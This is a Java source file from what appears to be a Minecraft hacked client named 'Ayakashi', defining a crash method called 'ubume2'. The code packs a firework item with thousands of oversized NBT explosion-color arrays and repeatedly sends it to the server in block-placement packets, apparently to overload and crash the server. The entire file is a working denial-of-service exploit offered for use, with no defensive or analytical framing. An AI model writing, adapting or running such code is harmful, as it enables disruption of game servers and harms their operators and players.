package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;

import java.util.Arrays;

@CrashInfo(
        name = "ubume2"
)
public class CrashUbume2 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Ubume method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));

        (new Thread(() -> {
            try {
                final ItemStack firework = new ItemStack(Items.fireworks);
                final NBTTagCompound outerTag = new NBTTagCompound();
                final NBTTagCompound tag2 = new NBTTagCompound();
                final NBTTagList list2 = new NBTTagList();
                final int[] arr = new int[64];
                for (int k = 0; k < 3260; ++k) {
                    Arrays.fill(arr, k + 1);
                    final NBTTagCompound explosion = new NBTTagCompound();
                    explosion.setIntArray("Colors", arr);
                    list2.appendTag(explosion);
                }
                tag2.setTag("Explosions", list2);
                tag2.setByte("Flight", (byte) 2);
                outerTag.setTag("Fireworks", tag2);
                firework.setTagCompound(outerTag);
                for (int i2 = 0; i2 < packets; ++i2) {
                    Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - 2.0, Minecraft.getMinecraft().thePlayer.posZ), 1, firework, 0.0f, 0.0f, 0.0f));
                    Thread.sleep(200L);
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
